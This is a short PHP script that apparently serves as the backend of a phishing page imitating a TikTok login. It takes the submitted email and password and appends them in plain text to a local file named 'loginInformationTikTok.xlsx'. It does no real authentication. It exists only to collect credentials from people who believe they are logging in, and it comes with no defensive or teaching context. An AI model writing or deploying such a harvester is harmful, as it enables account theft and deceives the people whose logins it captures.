<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'];
    $password = $_POST['password'];

    $filePath = 'D:\loginInformationTikTok.xlsx';

    // Check if the file already exists
    $fileExists = file_exists($filePath);

    // Open the file for appending
    $file = fopen($filePath, 'a');

    // If the file is new, add the column headers
    if (!$fileExists) {
        fputcsv($file, ['Email', 'Password']);
    }

    // Add the user's data
    fputcsv($file, [$email, $password]);

    // Close the file
    fclose($file);
}
?>
